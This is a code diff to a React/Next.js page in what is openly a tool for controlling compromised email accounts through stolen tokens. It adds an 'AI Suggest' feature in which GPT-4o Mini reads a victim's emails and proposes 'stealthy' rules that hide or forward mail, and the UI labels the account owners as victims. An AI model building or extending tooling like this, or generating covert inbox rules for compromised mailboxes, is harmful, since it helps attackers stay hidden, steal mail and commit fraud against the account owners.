@@ -4,11 +4,11 @@ import { useState, useEffect, useCallback, useRef } from "react";
 import { motion, AnimatePresence } from "framer-motion";
 import { useParams, useRouter } from "next/navigation";
 import { Token, Rule } from "@/types/token";
-import { fetchTokens, fetchRules, fetchGraphRules, createRule, deleteRule } from "@/lib/api";
+import { fetchTokens, fetchRules, fetchGraphRules, createRule, deleteRule, aiSuggestRules } from "@/lib/api";
 import {
   AlertCircle, ArrowLeft, Loader2, Mail, Plus, Trash2, Gavel,
   Shield, Check, X, Folder, Forward, ArrowRight, ListFilter,
-  RefreshCw,
+  RefreshCw, Sparkles,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -42,6 +42,9 @@ export default function RulesPage() {
   const [forwardTo, setForwardTo] = useState("");
   const [stopProcessing, setStopProcessing] = useState(true);
   const [creating, setCreating] = useState(false);
+  const [aiSuggestions, setAiSuggestions] = useState<any[]>([]);
+  const [aiLoading, setAiLoading] = useState(false);
+  const [aiDialogOpen, setAiDialogOpen] = useState(false);
 
   const loadToken = useCallback(async () => {
     if (!tokenId) return;
@@ -116,6 +119,32 @@ export default function RulesPage() {
     } catch (err: any) {
       toast.error("Failed to delete rule", { description: err.message });
     }
+  };
+
+  const handleAiSuggest = async () => {
+    if (!tokenId) return;
+    setAiLoading(true);
+    try {
+      const result = await aiSuggestRules(tokenId);
+      setAiSuggestions(result.suggestions || []);
+      setAiDialogOpen(true);
+      toast.success(`AI analyzed ${result.analyzed_messages} messages and suggested ${result.suggestions?.length || 0} rules`);
+    } catch (err: any) {
+      toast.error("AI suggestion failed", { description: err.message });
+    } finally {
+      setAiLoading(false);
+    }
+  };
+
+  const applyAiSuggestion = (suggestion: any) => {
+    setRuleName(suggestion.rule_name);
+    setSubjectKeywords(suggestion.condition_subject_contains?.join(", ") || "");
+    setSenderDomains(suggestion.condition_sender_domain?.join(", ") || "");
+    setMoveToFolder(suggestion.action_move_to_folder || "");
+    setForwardTo(suggestion.action_forward_to || "");
+    setAiDialogOpen(false);
+    setCreateDialogOpen(true);
+    toast.success("AI suggestion applied to form");
   };
 
   const resetForm = () => {
@@ -197,6 +226,9 @@ export default function RulesPage() {
           <h2 className="text-sm font-semibold tracking-tight text-foreground truncate">{token.email}</h2>
         </div>
         <div className="flex items-center gap-2 flex-shrink-0">
+          <Button variant="ghost" size="sm" onClick={handleAiSuggest} disabled={aiLoading} className="gap-1.5 h-8 text-xs text-purple-400 hover:text-purple-300">
+            <Sparkles className="h-3.5 w-3.5" /> {aiLoading ? "Analyzing..." : "AI Suggest"}
+          </Button>
           <Button variant="ghost" size="sm" onClick={() => setCreateDialogOpen(true)} className="gap-1.5 h-8 text-xs text-primary">
             <Plus className="h-3.5 w-3.5" /> New rule
           </Button>
@@ -515,6 +547,59 @@ export default function RulesPage() {
             <Button size="sm" onClick={handleCreateRule} disabled={creating || !ruleName.trim()} className="gap-1.5">
               {creating && <Loader2 className="h-3.5 w-3.5 animate-spin" />}
               <Plus className="h-3.5 w-3.5" /> Create rule
+            </Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
+
+      {/* AI Suggestions Dialog */}
+      <Dialog open={aiDialogOpen} onOpenChange={setAiDialogOpen}>
+        <DialogContent className="max-w-lg">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2">
+              <Sparkles className="h-5 w-5 text-purple-400" />
+              AI-Suggested Rules
+            </DialogTitle>
+            <DialogDescription>
+              GPT-4o Mini analyzed the victim's emails and suggested these stealthy rules.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="space-y-3 max-h-[60vh] overflow-y-auto">
+            {aiSuggestions.length === 0 && (
+              <p className="text-sm text-muted-foreground">No suggestions available. The victim's inbox may be empty.</p>
+            )}
+            {aiSuggestions.map((suggestion, idx) => (
+              <div key={idx} className="rounded-lg border border-white/5 bg-secondary/20 p-3 space-y-2">
+                <div className="flex items-center justify-between">
+                  <h4 className="text-sm font-medium text-foreground">{suggestion.rule_name}</h4>
+                  <Badge variant="outline" className="text-[10px]">
+                    {(suggestion.confidence * 100).toFixed(0)}% confidence
+                  </Badge>
+                </div>
+                <p className="text-xs text-muted-foreground">{suggestion.description}</p>
+                <div className="flex flex-wrap gap-1">
+                  {suggestion.condition_subject_contains?.map((kw: string, i: number) => (
+                    <Badge key={i} variant="secondary" className="text-[10px]">Subject: {kw}</Badge>
+                  ))}
+                  {suggestion.condition_sender_domain?.map((d: string, i: number) => (
+                    <Badge key={i} variant="secondary" className="text-[10px]">From: {d}</Badge>
+                  ))}
+                  {suggestion.action_move_to_folder && (
+                    <Badge key="move" variant="secondary" className="text-[10px]">Move to: {suggestion.action_move_to_folder}</Badge>
+                  )}
+                  {suggestion.action_forward_to && (
+                    <Badge key="fwd" variant="secondary" className="text-[10px]">Forward to: {suggestion.action_forward_to}</Badge>
+                  )}
+                </div>
+                <Button size="sm" variant="outline" className="w-full text-xs" onClick={() => applyAiSuggestion(suggestion)}>
+                  <Plus className="h-3.5 w-3.5 mr-1" /> Use this suggestion
+                </Button>
+              </div>
+            ))}
+          </div>
+          <DialogFooter>
+            <Button variant="outline" size="sm" onClick={() => setAiDialogOpen(false)}>
+              Close
             </Button>
           </DialogFooter>
         </DialogContent>
